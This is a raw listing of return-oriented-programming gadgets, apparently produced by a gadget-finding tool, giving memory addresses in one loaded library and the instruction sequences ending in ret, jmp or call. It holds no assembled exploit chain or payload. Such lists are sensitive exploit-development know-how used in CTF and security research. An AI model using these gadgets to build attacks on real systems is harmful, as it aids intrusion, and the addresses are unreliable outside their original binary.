0x00002aaaaab81eef : add byte ptr [rax], al ; add bl, al ; mov eax, 2 ; ret
0x00002aaaaabad9db : add byte ptr [rax], al ; add bl, al ; mov eax, 3 ; ret
0x00002aaaaabad9d5 : add byte ptr [rax], al ; add bl, al ; mov eax, 4 ; ret
0x00002aaaaab5bbf2 : add byte ptr [rax], al ; add bl, al ; mov rsi, rbx ; mov rdi, rax ; call rcx
0x00002aaaaab4a8ba : add byte ptr [rax], al ; add bl, al ; nop ; and ecx, 0xffffffcf ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaaba1e5a : add byte ptr [rax], al ; add bl, al ; nop ; mov eax, 0xfffa ; ret
0x00002aaaaac09e0b : add byte ptr [rax], al ; add bl, al ; nop ; xor eax, eax ; ret
0x00002aaaaac0686f : add byte ptr [rax], al ; add bl, al ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaac17908 : add byte ptr [rax], al ; add bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab5da2a : add byte ptr [rax], al ; add bl, al ; ret
0x00002aaaaac0955c : add byte ptr [rax], al ; add bl, al ; xor eax, eax ; ret
0x00002aaaaab505db : add byte ptr [rax], al ; add bl, ch ; fucomp st(0) ; ret
0x00002aaaaab93638 : add byte ptr [rax], al ; add bl, ch ; ret 0x1f0f
0x00002aaaaab7b22d : add byte ptr [rax], al ; add bl, dh ; movq qword ptr [rdi - 1], mm0 ; ret
0x00002aaaaab7b23d : add byte ptr [rax], al ; add bl, dh ; movq qword ptr [rdi], mm0 ; ret
0x00002aaaaab00d55 : add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaac7e449 : add byte ptr [rax], al ; add byte ptr [0xffffffffe8b00000], dl ; int1 ; call qword ptr [rbx]
0x00002aaaaac170bb : add byte ptr [rax], al ; add byte ptr [rax + 0x16], bh ; ret
0x00002aaaaab2ab8b : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaabb7e50 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x148
0x00002aaaaab95952 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x2948
0x00002aaaaab00dbc : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x860f
0x00002aaaaab5cb89 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; sal byte ptr [rbp - 0x51], 1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac68ab3 : add byte ptr [rax], al ; add byte ptr [rax + 0x43], dl ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaab41949 : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; add al, 0x86 ; add rax, rsi ; jmp rax
0x00002aaaaab84a79 : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x00002aaaaab47d2d : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret 0x8d4c
0x00002aaaaab2064a : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x00002aaaaaba168d : add byte ptr [rax], al ; add byte ptr [rax + 0x66], bh ; syscall ; ret
0x00002aaaaaba16ad : add byte ptr [rax], al ; add byte ptr [rax + 0x68], bh ; syscall ; ret
0x00002aaaaaba169d : add byte ptr [rax], al ; add byte ptr [rax + 0x6b], bh ; syscall ; ret
0x00002aaaaaba16bd : add byte ptr [rax], al ; add byte ptr [rax + 0x6c], bh ; syscall ; ret
0x00002aaaaac90461 : add byte ptr [rax], al ; add byte ptr [rax + 0x6f980002], ch ; clc ; call rcx
0x00002aaaaab7b77d : add byte ptr [rax], al ; add byte ptr [rax + 0x78d4837], cl ; ret
0x00002aaaaaba1da8 : add byte ptr [rax], al ; add byte ptr [rax + 0x7f], bh ; ret
0x00002aaaaab9d9ea : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x00002aaaaac14c62 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8348
0x00002aaaaabe3419 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8349
0x00002aaaaabd397f : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaabcdb14 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x00002aaaaabcda8a : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f6
0x00002aaaaaafab96 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc985
0x00002aaaaaafa395 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xdb85
0x00002aaaaaafd092 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xed85
0x00002aaaaaba03cb : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00002aaaaaba1e6d : add byte ptr [rax], al ; add byte ptr [rax + 0xfc17], bh ; ret
0x00002aaaaac81f99 : add byte ptr [rax], al ; add byte ptr [rax + 1], ah ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81fb1 : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; add byte ptr [rax - 0x6d], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabff45d : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; pop rbx ; ret
0x00002aaaaab1f0b3 : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaab7f310 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00002aaaaab11034 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaab10f0d : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x1a75
0x00002aaaaac024ad : add byte ptr [rax], al ; add byte ptr [rax + 2], bh ; ret
0x00002aaaaaba2044 : add byte ptr [rax], al ; add byte ptr [rax + 7], bh ; ret
0x00002aaaaac507c9 : add byte ptr [rax], al ; add byte ptr [rax + rax + 0xbf0000], bh ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7d4e1 : add byte ptr [rax], al ; add byte ptr [rax + rax*4], dh ; add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac7bfa1 : add byte ptr [rax], al ; add byte ptr [rax + rax*8], ch ; add byte ptr [rax], ch ; mov ch, 0xfb ; call qword ptr [rax]
0x00002aaaaaae031d : add byte ptr [rax], al ; add byte ptr [rax + rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaaae27ad : add byte ptr [rax], al ; add byte ptr [rax + rax], dh ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaac7c17d : add byte ptr [rax], al ; add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c5 : add byte ptr [rax], al ; add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaab809b3 : add byte ptr [rax], al ; add byte ptr [rax + rbp*2 + 0x48], dh ; lea eax, dword ptr [rdi - 0x10] ; ret
0x00002aaaaac7a781 : add byte ptr [rax], al ; add byte ptr [rax + rbp*4], cl ; add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac857a9 : add byte ptr [rax], al ; add byte ptr [rax + rbx*2 + 1], dh ; add byte ptr [rax - 0x7b], dh ; cmc ; jmp rax
0x00002aaaaac75761 : add byte ptr [rax], al ; add byte ptr [rax + rbx*2], ch ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac7d781 : add byte ptr [rax], al ; add byte ptr [rax + rbx*8], cl ; add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac90769 : add byte ptr [rax], al ; add byte ptr [rax + rcx], dh ; add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaac70749 : add byte ptr [rax], al ; add byte ptr [rax + rcx], dl ; add byte ptr [rax], al ; test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaac837a1 : add byte ptr [rax], al ; add byte ptr [rax + rdi + 1], ch ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac837b9 : add byte ptr [rax], al ; add byte ptr [rax + rdi - 0x20fffff], al ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7b7c9 : add byte ptr [rax], al ; add byte ptr [rax + rdi*4 + 0x1e00000], dl ; out dx, eax ; jmp rsi
0x00002aaaaac80fd1 : add byte ptr [rax], al ; add byte ptr [rax + rdx - 0x4307ffff], bl ; jmp qword ptr [rdi]
0x00002aaaaac84f71 : add byte ptr [rax], al ; add byte ptr [rax + rdx*2], bh ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac74f91 : add byte ptr [rax], al ; add byte ptr [rax + rdx*2], bl ; add byte ptr [rax - 0x4a], bl ; jmp 0x19ffa5
0x00002aaaaac82fe9 : add byte ptr [rax], al ; add byte ptr [rax + rsi - 0x1cbfffff], dh ; hlt ; call qword ptr [rsi]
0x00002aaaaac86fb1 : add byte ptr [rax], al ; add byte ptr [rax + rsi*2 + 1], bh ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f81 : add byte ptr [rax], al ; add byte ptr [rax + rsi*2 + 1], cl ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f51 : add byte ptr [rax], al ; add byte ptr [rax + rsi*2], bl ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7afe1 : add byte ptr [rax], al ; add byte ptr [rax + rsi*4 + 0x54180000], ch ; cli ; call qword ptr [rax]
0x00002aaaaac7afb1 : add byte ptr [rax], al ; add byte ptr [rax + rsi*4], bh ; add byte ptr [rax + 0x1a], bh ; cli ; call qword ptr [rax]
0x00002aaaaac7efd9 : add byte ptr [rax], al ; add byte ptr [rax + rsi*8 + 0x13a00000], ah ; jmp qword ptr [rcx]
0x00002aaaaab0b07f : add byte ptr [rax], al ; add byte ptr [rax - 0x2d], cl ; loopne 0x360d9 ; or dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaab112c7 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab48eda : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaab803dd : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab803bd : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab8041d : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab803cd : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab8040d : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaac5c49d : add byte ptr [rax], al ; add byte ptr [rax - 0x3f000dfc], dh ; add al, 0xf2 ; call rax
0x00002aaaaab09c08 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f91f09a], al ; ret
0x00002aaaaaaf4919 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x00002aaaaab9e63d : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0xeb11
0x00002aaaaabd3dcd : add byte ptr [rax], al ; add byte ptr [rax - 0x6af0dc06], al ; ret 0xc084
0x00002aaaaaaf592d : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add eax, 0x16b154 ; ret
0x00002aaaaaaf593d : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add eax, 0x16d066 ; ret
0x00002aaaaabff4fd : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add eax, 0x61a3e ; ret
0x00002aaaaab809fd : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; clc ; ret
0x00002aaaaab80a0d : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; cld ; ret
0x00002aaaaabf4b1d : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; cmp eax, 0x2a7bd5 ; call rax
0x00002aaaaab809ed : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; hlt ; ret
0x00002aaaaab1a0db : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0x1cb ; call rax
0x00002aaaaab44216 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0x30 ; call rax
0x00002aaaaab51746 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xffffe1e0 ; call rax
0x00002aaaaab512f6 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xffffe630 ; call rax
0x00002aaaaab50f06 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xffffea20 ; call rax
0x00002aaaaab4fea6 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffa80 ; call rax
0x00002aaaaab4fc36 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffcf0 ; call rax
0x00002aaaaab4450f : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffd37 ; call rax
0x00002aaaaab0f71f : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaac15330 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add eax, 0x2840d6 ; call qword ptr [rax]
0x00002aaaaac14d1d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add eax, 0x2846e9 ; call qword ptr [rax]
0x00002aaaaab51b0d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add eax, 0x347a09 ; ret
0x00002aaaaaaf6a4d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add eax, 0x3a68b9 ; ret
0x00002aaaaaaf6a3d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; add eax, 0x3a68d9 ; ret
0x00002aaaaabd225c : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; and al, 0xb0 ; ret
0x00002aaaaab50704 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaab47fe4 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; jp 0x73033 ; jmp 0x72fb8
0x00002aaaaabc0743 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; mov ebp, 0xffffff78 ; call rbx
0x00002aaaaab49f6d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; mov rax, qword ptr [rax + 0x4c] ; ret
0x00002aaaaaaf842d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaaba5dc1 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; pop rbp ; adc al, ch ; ret
0x00002aaaaac26e2d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab9dfdd : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab30e55 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; xor eax, 0x367111 ; call rax
0x00002aaaaab307ff : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; xor eax, 0x367767 ; call rax
0x00002aaaaab25047 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; xor eax, 0x372f1f ; call rax
0x00002aaaaab223cb : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; xor eax, 0x375b9b ; call rax
0x00002aaaaabf803d : add byte ptr [rax], al ; add byte ptr [rax - 0x76acfe07], al ; ror dword ptr [rdi], cl ; xchg eax, esi ; ret 0xfb83
0x00002aaaaab5db1f : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab0862e : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; and al, 0x28 ; call 0x1f8aa
0x00002aaaaab0f6ad : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; cqo ; idiv rsi ; ret
0x00002aaaaab51b3d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaabd7565 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab5892f : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx - 0x3d] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4721a : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47062 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x28] ; jmp rax
0x00002aaaaac174e7 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x75] ; and al, 0x10 ; call rax
0x00002aaaaab92e74 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fmul dword ptr [rax - 0x7d] ; ret
0x00002aaaaabd8363 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe8
0x00002aaaaabd8263 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe9
0x00002aaaaab42cb3 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; mov dh, byte ptr [rax] ; add dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaab4d4b1 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; mov edx, 0x130 ; pop rbx ; ret
0x00002aaaaabfe5ea : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out 0x4c, eax ; mov esi, esi ; call 0x558bb
0x00002aaaaab5cfc3 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call rax
0x00002aaaaac0275a : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; call qword ptr [rbx]
0x00002aaaaabd7f1f : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x00002aaaaac00ed1 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab4bca1 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; pop rbp ; sbb al, ch ; ret
0x00002aaaaabe8b0f : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; push rbp ; nop ; mov rdx, r13 ; call rax
0x00002aaaaab13a20 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab584da : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x00002aaaaab840a6 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x2944
0x00002aaaaab36cd5 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x30e8
0x00002aaaaabc448d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaab0103b : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaaba2441 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab440c6 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaabda2e3 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xbc41
0x00002aaaaab2c0dd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab69643 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xf748
0x00002aaaaab4f3de : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaac0673a : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x131756 ; ret
0x00002aaaaac094aa : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x1344c6 ; ret
0x00002aaaaac094c2 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x1344de ; ret
0x00002aaaaac09cfa : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d16 ; ret
0x00002aaaaac09d12 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d2e ; ret
0x00002aaaaac09d42 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d5e ; ret
0x00002aaaaab3868e : add byte ptr [rax], al ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret 3
0x00002aaaaac0d331 : add byte ptr [rax], al ; add byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0x19], 0x5b ; ret
0x00002aaaaab5bd1b : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x00002aaaaabcb60d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; in al, dx ; or dh, dh ; ret 0x7540
0x00002aaaaab070dd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabfafdd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3108
0x00002aaaaab7e59d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x00002aaaaabd2f7d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3c01
0x00002aaaaac128fd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x00002aaaaaaf6903 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaabb9cfd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x00002aaaaac48dfd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaabdd388 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4814
0x00002aaaaab2ba05 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00002aaaaaafe014 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4904
0x00002aaaaac1adb3 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaabac05d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaab62f3d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x6620
0x00002aaaaab62ecd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x7e20
0x00002aaaaab840dd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8301
0x00002aaaaaafa19d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8901
0x00002aaaaabbb0bd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8908
0x00002aaaaab359ed : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xb908
0x00002aaaaabe2a65 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xc601
0x00002aaaaac1c931 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1addd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab90b8d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaab73aad : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x00002aaaaaafeabe : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaac2ec44 : add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00002aaaaabed999 : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab08f0b : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; pop rbx ; ret
0x00002aaaaab0a48b : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaac7c17c : add byte ptr [rax], al ; add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c4 : add byte ptr [rax], al ; add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaac6920c : add byte ptr [rax], al ; add byte ptr [rax], al ; adc byte ptr [rax], al ; sti ; jmp rax
0x00002aaaaac5b45b : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, al ; pop rcx ; out dx, al ; jmp rax
0x00002aaaaac5a513 : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x185522 ; jmp qword ptr [rdi]
0x00002aaaaac5a593 : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x1855a2 ; jmp qword ptr [rdi]
0x00002aaaaac5a613 : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, bh ; loope 0x185622 ; jmp qword ptr [rdi]
0x00002aaaaac82b85 : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, byte ptr [rcx + 0x283100e] ; push rsp ; ret
0x00002aaaaab7b22b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; movq qword ptr [rdi - 1], mm0 ; ret
0x00002aaaaab7b23b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; movq qword ptr [rdi], mm0 ; ret
0x00002aaaaab4a8cb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaac68ab1 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x43], dl ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaab47d2b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret 0x8d4c
0x00002aaaaab7b77b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x78d4837], cl ; ret
0x00002aaaaaba1e6b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0xfc17], bh ; ret
0x00002aaaaabd2a6b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaac024ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 2], bh ; ret
0x00002aaaaac7c17b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c3 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaabd3dcb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x6af0dc06], al ; ret 0xc084
0x00002aaaaab809fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; clc ; ret
0x00002aaaaab80a0b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; cld ; ret
0x00002aaaaab809eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; hlt ; ret
0x00002aaaaabd225a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; and al, 0xb0 ; ret
0x00002aaaaaaf842b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab9dfdb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab51b3b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaab584d8 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x00002aaaaab36cd3 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x30e8
